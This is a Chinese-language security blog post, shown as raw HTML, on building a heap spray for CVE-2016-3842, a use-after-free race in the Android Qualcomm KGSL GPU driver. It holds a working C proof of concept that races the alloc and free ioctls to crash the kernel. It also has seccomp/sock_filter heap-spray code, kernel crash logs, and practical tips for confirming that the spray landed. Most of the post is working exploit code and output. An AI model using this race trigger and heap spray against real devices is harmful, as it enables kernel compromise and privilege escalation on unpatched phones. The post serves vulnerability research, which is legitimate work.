<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="chrome=1">
  
  <title>实现CVE-2016-3842的堆喷 | Ericky1992</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  
    <meta name="author" content="Ericky1992">
  
  
    <meta name="description" content="前言看到论坛有大牛分析了这个CVE-2016-3842的利用方法，我之前也对这个漏洞的堆喷做了一些笔记，这里分享一下。首先要先感谢一下某因幡和Retme两位大神，在研究这个漏洞期间遇到不少的问题，他们都一一给我解答了，这里对他们表示再次感谢。
漏洞介绍这个漏洞是GPU中的一个UAF漏洞，是由于race condition 造成的。在GPU驱动中提供了一个ioctl命令IOCTL_KGSL_GPUM">
  
  <meta name="description" content="前言看到论坛有大牛分析了这个CVE-2016-3842的利用方法，我之前也对这个漏洞的堆喷做了一些笔记，这里分享一下。首先要先感谢一下某因幡和Retme两位大神，在研究这个漏洞期间遇到不少的问题，他们都一一给我解答了，这里对他们表示再次感谢。 漏洞介绍这个漏洞是GPU中的一个UAF漏洞，是由于race condition 造成的。在GPU驱动中提供了一个ioctl命令IOCTL_KGSL_GPUM">
<meta name="keywords" content="漏洞 cve 堆喷 内核漏洞 exp">
<meta property="og:type" content="article">
<meta property="og:title" content="实现CVE-2016-3842的堆喷">
<meta property="og:url" content="http://yoursite.com/2016/09/12/实现CVE-2016-3842的堆喷/index.html">
<meta property="og:site_name" content="Ericky1992">
<meta property="og:description" content="前言看到论坛有大牛分析了这个CVE-2016-3842的利用方法，我之前也对这个漏洞的堆喷做了一些笔记，这里分享一下。首先要先感谢一下某因幡和Retme两位大神，在研究这个漏洞期间遇到不少的问题，他们都一一给我解答了，这里对他们表示再次感谢。 漏洞介绍这个漏洞是GPU中的一个UAF漏洞，是由于race condition 造成的。在GPU驱动中提供了一个ioctl命令IOCTL_KGSL_GPUM">
<meta property="og:image" content="http://img.blog.csdn.net/20170612223024471?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
<meta property="og:image" content="http://img.blog.csdn.net/20170612223146871?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
<meta property="og:updated_time" content="2017-08-27T16:11:04.436Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="实现CVE-2016-3842的堆喷">
<meta name="twitter:description" content="前言看到论坛有大牛分析了这个CVE-2016-3842的利用方法，我之前也对这个漏洞的堆喷做了一些笔记，这里分享一下。首先要先感谢一下某因幡和Retme两位大神，在研究这个漏洞期间遇到不少的问题，他们都一一给我解答了，这里对他们表示再次感谢。 漏洞介绍这个漏洞是GPU中的一个UAF漏洞，是由于race condition 造成的。在GPU驱动中提供了一个ioctl命令IOCTL_KGSL_GPUM">
<meta name="twitter:image" content="http://img.blog.csdn.net/20170612223024471?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
  
  
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
  
  <link rel="stylesheet" href="/css/style.css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
</head>

<body>
  <div class="wrapper">
    <header id="header">
  <div class="title">
    <h1><a href="/">Ericky1992</a></h1>
    <p><a href="/">pursue ceaselessly</a></p>
  </div>
  <nav class="nav">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/">About</a></li>
      
      
    </ul>
    <div class="clearfix"></div>
  </nav>
  <div class="clearfix"></div>
</header>
    <div class="content"><article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/09/12/实现CVE-2016-3842的堆喷/">
  <time datetime="2016-09-12T14:33:00.000Z">
    2016-09-12
  </time>
</a>
    
    
  
    <h1 class="title">实现CVE-2016-3842的堆喷</h1>
  

  </header>
  
  <div class="entry">
    
      <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到论坛有大牛分析了这个CVE-2016-3842的利用方法，我之前也对这个漏洞的堆喷做了一些笔记，这里分享一下。首先要先感谢一下某因幡和Retme两位大神，在研究这个漏洞期间遇到不少的问题，他们都一一给我解答了，这里对他们表示再次感谢。</p>
<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>这个漏洞是GPU中的一个UAF漏洞，是由于race condition 造成的。在GPU驱动中提供了一个ioctl命令IOCTL_KGSL_GPUMEM_ALLOC ，这个命令可以让用户去分配一块GPU共享内存。当一个线程调用这个ioctl之后，程序会创建一个kgsl_mem_entry的结构体用来描述一块已经分配好的内存。与此同时函数kgsl_mem_entry_attach_process会通过调用idr_alloc函数给kgsl_mem_entry分配一个ID。在这个时候，另外一个线程调用 IOCTL_KGSL_GPUMEM_FREE_ID 的ioctl命令去释放这个内存块，如果能在分配函数完成之前将这个kgsl_mem_entry释放掉，那么直接就造成了UAF了。</p>
<p>再来看一下官方介绍：<br>If we add the mem entry pointer in the process idr and rb tree too early, other threads can do operations on the entry by guessing the ID or GPU address before the object gets returned by the creating operation.</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>因为每在内核分配的第一个kgsl_mem_entry所分配的ID为1，所以可以准确释放刚分配好的内存块。<br>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">void kgsl2()&#123;</div><div class="line">  </div><div class="line">  int fd = open(&quot;/dev/kgsl-3d0&quot;,0);</div><div class="line">  </div><div class="line">  struct kgsl_gpumem_alloc arg;</div><div class="line">  struct kgsl_gpumem_free_id arg_free;</div><div class="line">  int ret = 0;</div><div class="line">  </div><div class="line">  arg.gpuaddr = 0x1000;</div><div class="line">  arg.size = 0x40;</div><div class="line">  arg.flags = 0x1000008;</div><div class="line">  </div><div class="line">  int pid = fork();</div><div class="line">  if(pid)&#123;</div><div class="line">      while(1)&#123;</div><div class="line">        arg_free.id = 1;</div><div class="line">        ioctl(fd,IOCTL_KGSL_GPUMEM_FREE_ID, &amp;arg_free);</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">    ret = ioctl(fd,IOCTL_KGSL_GPUMEM_ALLOC, &amp;arg);</div><div class="line">    if(ret)&#123;</div><div class="line">      perror(&quot;alloc&quot;);</div><div class="line">    &#125;</div><div class="line">  </div><div class="line">&#125;</div><div class="line">  </div><div class="line">int main()&#123;</div><div class="line">    printf(&quot;******CVE-2016-3842******&quot; );</div><div class="line">    kgsl2();</div><div class="line"> </div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Crash-Log："><a href="#Crash-Log：" class="headerlink" title="Crash Log："></a>Crash Log：</h2><p>[ 4624.507633] Modules linked in:<br>[ 4624.507921] CPU: 0 PID: 7500 Comm: CVE-2016-3842 Tainted: G        W    3.10.73-g1bbb776-dirty #13<br>[ 4624.508026] task: ffffffc042c25600 ti: ffffffc03db7c000 task.ti: ffffffc03db7c000<br>[ 4624.508232] PC is at _raw_spin_lock+0x24/0x5c<br>[ 4624.508421] LR is at _raw_spin_lock+0x20/0x5c<br>[ 4624.508525] pc : [<ffffffc001005584>] lr : [<ffffffc001005580>] pstate: 60000145<br>[ 4624.508712] sp : ffffffc03db7fc30<br>[ 4624.508815] x29: ffffffc03db7fc30 x28: ffffffc03db7c000<br>[ 4624.509113] x27: 0000000000000044 x26: 0000000000000000<br>[ 4624.509494] x25: ffffffc001fe7e18 x24: 00000000c0000000<br>[ 4624.509787] x23: 0000000000000001 x22: ffffffc01d9e941c<br>[ 4624.510170] x21: 0000000000000000 x20: ffffffc001d91000<br>[ 4624.510467] x19: 000000000000001c x18: 0000000000000000<br>[ 4624.510855] x17: 0000000000000001 x16: ffffffc0003455f8<br>[ 4624.511156] x15: 0000007fa7426028 x14: 0000007fa7426018<br>[ 4624.511535] x13: 0000000000000003 x12: 0000000000000001<br>[ 4624.511830] x11: 0000000000000001 x10: 000000000000000d<br>[ 4624.512209] x9 : 000000000046dc68 x8 : 000000000000001d<br>[ 4624.512511] x7 : 0000000000000001 x6 : 0000000000000000<br>[ 4624.512807] x5 : 0000000000000000 x4 : 0000007fd7478a88<br>[ 4624.513190] x3 : 0000000000000000 x2 : 0000000000000000<br>[ 4624.513488] x1 : 00000000fe9223ab x0 : ffffffc001d49690<br>[ 4624.513867]<br>[ 4624.513972] Process CVE-2016-3842 (pid: 7500, stack limit = 0xffffffc03db7c058)<br>[ 4624.514158] Call trace:<br>[ 4624.514264] [<ffffffc001005584>] _raw_spin_lock+0x24/0x5c<br>[ 4624.514378] [<ffffffc000611504>] _sharedmem_free_entry+0x84/0x2a4<br>[ 4624.514570] [<ffffffc0006118b0>] kgsl_ioctl_gpumem_free_id+0x10c/0x12c<br>[ 4624.514677] [<ffffffc000617668>] kgsl_ioctl_helper+0x250/0x2ec<br>[ 4624.514865] [<ffffffc000617740>] kgsl_ioctl+0x3c/0x4c<br>[ 4624.514975] [<ffffffc000345520>] do_vfs_ioctl+0x4a4/0x57c<br>[ 4624.515163] [<ffffffc000345660>] SyS_ioctl+0x68/0x94<br>[ 4624.515271] Code: 97c822ff 52800020 97c94706 f9800271 (885ffe60)<br>[ 4624.515635] —[ end trace b6c5dfe1e97b62c8 ]—<br>[ 4624.583132] Kernel panic - not syncing: Fatal exception<br>[ 4624.583362] CPU1: stopping</ffffffc000345660></ffffffc000345520></ffffffc000617740></ffffffc000617668></ffffffc0006118b0></ffffffc000611504></ffffffc001005584></ffffffc001005580></ffffffc001005584></p>
<h2 id="实际堆喷中遇到的问题"><a href="#实际堆喷中遇到的问题" class="headerlink" title="实际堆喷中遇到的问题"></a>实际堆喷中遇到的问题</h2><h4 id="1-使用seccomp被拦截"><a href="#1-使用seccomp被拦截" class="headerlink" title="1.使用seccomp被拦截"></a>1.使用seccomp被拦截</h4><p>用的是seccomp这个syscall来进行堆喷，seccomp被拦截了，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Ericky:CVE-2016-3842 heyao$ adb shell ./data/local/tmp/CVE-2016-3842</div><div class="line">prog.len:18</div><div class="line">prctl(SECCOMP): Permission denied</div></pre></td></tr></table></figure>
<p>在提示过后，查看android内核源码，发现并不需要任何权限，但是要在使用之前设置一个Admin的进程属性来绕过。</p>
<h4 id="2-堆喷如何判断是否成功"><a href="#2-堆喷如何判断是否成功" class="headerlink" title="2.堆喷如何判断是否成功"></a>2.堆喷如何判断是否成功</h4><p>调试漏洞时，选择自己能改内核代码的机器来调。printk就能直观显示是否成功。</p>
<p>还有相对高级的方法是，可以在喷的内容中做一些标记，比如deadbeef，这样喷上去之后在崩溃，crash寄存器中会有反馈。</p>
<p>建议优先用printk。</p>
<h4 id="3-崩溃日志的疑问"><a href="#3-崩溃日志的疑问" class="headerlink" title="3.崩溃日志的疑问"></a>3.崩溃日志的疑问</h4><p>按漏洞的原理来看，崩溃时候的函数应该是顺着IOCTL_KGSL_MAP_USER_MEM这个ioctl的，但是为什么崩溃信息里为什么会是这个函数导致崩溃的呢？看这个崩溃信息，让我有点迷糊了，不知道准确的触发时机是什么时候了，是不是在我的机器上就是这个函数触发的崩溃？<br><img src="http://img.blog.csdn.net/20170612223024471?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>ShenDi大神的说法是这样的， “触发时机是有2～3处的，这取决于free的时机，你没法控制这个时机，但是如果你能喷堆成功，就能保证这2～3个时机都不会崩溃。”后来经我的验证，是因为我用的是5X的机器，而他用的是6P，崩溃信息确实不一样。</p>
<h4 id="4-关于堆喷结构体sock-filter"><a href="#4-关于堆喷结构体sock-filter" class="headerlink" title="4.关于堆喷结构体sock_filter"></a>4.关于堆喷结构体sock_filter</h4><p>对于sock_filter，如果不加修饰的随便定义这个结构体去喷，虽然它也会被kmalloc，只不过之后校验参数的时候 会失败，然后会被free掉，这个值得注意。因为如果seccomp失败的话，调用一次和调用一万次是没有区别的，kmalloc会永远落在同一个object上。</p>
<p>了解了以上这些，就可以开始尝试堆喷了，堆喷代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">void *heap_spray_tid(void *args)&#123;</div><div class="line">     struct sock_filter filter[] = &#123;  </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">       BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">     &#125;;</div><div class="line">   struct sock_fprog prog = &#123;</div><div class="line">      .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),</div><div class="line">      .filter = filter,</div><div class="line">   &#125;;</div><div class="line">   if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) &#123;</div><div class="line">           printf(&quot;PR_SET_NO_NEW_PRIVS Failed......!\n&quot;);</div><div class="line">           return 1;</div><div class="line">       &#125;</div><div class="line"> </div><div class="line"> </div><div class="line">   for (; !heap_spray_done;) &#123;</div><div class="line"> </div><div class="line">    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog)) &#123;</div><div class="line">           perror(&quot;prctl(SECCOMP)&quot;);</div><div class="line">         &#125;else&#123;</div><div class="line"> </div><div class="line">         &#125;</div><div class="line">   &#125;</div><div class="line">｝</div></pre></td></tr></table></figure>
<p>内核print堆喷信息如下：<br><img src="http://img.blog.csdn.net/20170612223146871?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>经过不断的尝试，最后堆喷成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">[  127.245287] Unable to handle kernel paging request at virtual address 17fff000c</div><div class="line">[  127.245303] pgd = ffffffc050824000</div><div class="line">[  127.245308] [17fff000c] *pgd=0000000000000000</div><div class="line">[  127.245320] Internal error: Oops: 96000005 [#1] PREEMPT SMP</div><div class="line">[  127.245330] CPU: 0 PID: 5453 Comm: CVE-2016-3842 Tainted: G        W    3.10.73-g9b6596d #1</div><div class="line">[  127.245337] task: ffffffc0a9554080 ti: ffffffc050834000 task.ti: ffffffc050834000</div><div class="line">[  127.245350] PC is at msm_iommu_map_range+0x8c/0x344</div><div class="line">[  127.245356] LR is at msm_iommu_map_range+0x6c/0x344</div><div class="line">[  127.245361] pc : [&lt;ffffffc0009f7c40&gt;] lr : [&lt;ffffffc0009f7c20&gt;] pstate: 80000145</div><div class="line">[  127.245365] sp : ffffffc050837b60</div><div class="line">[  127.245370] x29: ffffffc050837b60 x28: ffffffc050834000 </div><div class="line">[  127.245378] x27: 0000000000000001 x26: 0000000000000000 </div><div class="line">[  127.245386] x25: ffffffc050837bf0 x24: 0000000000100000 </div><div class="line">[  127.245394] x23: 00000000e8000000 x22: ffffffc001afe000 </div><div class="line">[  127.245402] x21: 000000017fff0000 x20: ffffffc0b87a9580 </div><div class="line">[  127.245410] x19: 0000000000100000 x18: ffffffc050837968 </div><div class="line">[  127.245419] x17: 0000000000000001 x16: ffffffc000233af8 </div><div class="line">[  127.245427] x15: 0000000000000000 x14: 0ffffffffffffffe </div><div class="line">[  127.245435] x13: 0000000000000030 x12: 0101010101010101 </div><div class="line">[  127.245443] x11: 7f7f7f7f7f7f7f7f x10: 7757597353435251 </div><div class="line">[  127.245451] x9 : ffffffc050837890 x8 : 001d1649d2b64000 </div><div class="line">[  127.245459] x7 : 0000000000000018 x6 : ffffffc0009f7bb4 </div><div class="line">[  127.245468] x5 : ffffffc0b87a9580 x4 : 0000000000000000 </div><div class="line">[  127.245475] x3 : 0000000000000000 x2 : ffffffc0b9e63418 </div><div class="line">[  127.245484] x1 : ffffffc0b9ebc818 x0 : 0000000000000012 </div><div class="line"> </div><div class="line">struct sock_filter filter[] = &#123;  </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line"> </div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),</div><div class="line">      &#125;;</div><div class="line">#define         BPF_RET         0x06</div><div class="line">#define         BPF_K           0x00</div><div class="line">#define SECCOMP_RET_ALLOW  0x7fff0000U /* allow */</div></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>折腾了很久，终于堆喷成功。多看代码，多尝试，多坚持。</p>

    
  </div>
  <footer>
    
      
  <div class="categories">
    <a class="categories-link" href="/categories/Android/">Android</a>
  </div>

      
  <div class="tags">
    <a class="tags-link" href="/tags/漏洞-cve-堆喷-内核漏洞-exp/">漏洞 cve 堆喷 内核漏洞 exp</a>
  </div>

    
    <div class="clearfix"></div>
  </footer>
</article>

</div>
  </div>
  <footer id="footer"><div class="copyright">
  
  &copy; 2017 <a href="/">Ericky1992</a>
  
</div>
<div class="theme-copyright">
  Theme by <a href="https://github.com/orderedlist" target="_blank">orderedlist</a>
   | 
  Redesign by <a href="http://heroicyang.com/" target="_blank">Heroic Yang</a>
</div>
<div class="clearfix"></div></footer>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
<script src="/js/scale.fix.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
  (function($){
    $('.fancybox').fancybox();
  })(jQuery);
</script>

</body>
</html>